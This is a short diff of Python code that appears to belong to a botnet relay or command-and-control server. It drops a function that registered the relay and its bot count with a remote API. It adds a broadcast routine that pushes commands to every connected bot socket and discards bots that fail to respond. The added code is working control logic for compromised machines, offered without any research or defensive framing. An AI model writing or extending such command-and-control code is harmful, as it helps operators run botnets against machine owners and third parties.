@@ -7,7 +7,7 @@ from socket import socket as Sock
 from cryptography.fernet import Fernet
 from .config import RelayConfig
 
-class Loops():
+class Core():
     def __init__(
         self, 
         config: RelayConfig = RelayConfig()
@@ -30,35 +30,30 @@ class Loops():
 
         return msg
 
-    def relay_api(
-        self,
-        data: dict,
-        act: bool,
-    ) -> bool:
-        ip: str = data['ip']
-        bots = data['bots']
-
-        url: str = f"{self.config.API_URL}/relays_edit?urlkey={self.config.URL_KEY}&action={act}&ip={ip}&bots={bots}"
-
-        try:
-            res: str = rget(url, timeout=5000).json()
-            return res == "ok"
-
-        except Exception as e:
-            self.log(f"error \n{url}\n{e}\n\n")
-            return False
-
     def send(
         self,
         s: Sock,
         data: str,
-        escape=True,
-        reset=True,
+        escape: bool = True,
+        reset: bool = True,
     ) -> None:
         if reset: data += self.config.COLOR_RESET
         if escape: data += '\r\n'
+        data += '\x00' # sign the end of a message for the bot
 
         s.send(data.encode())
+
+    def broadcast(
+        self,
+        data: str,
+    ) -> None:
+        self.log(f"send {data}")
+
+        for bot in self.config.bots_sock.keys():
+            try: self.send(bot, f'{data}', False, False)
+            except Exception:
+                self.config.bots_sock.pop(bot)
+                bot.close()
 
     def ping(self) -> None:
         while 1:
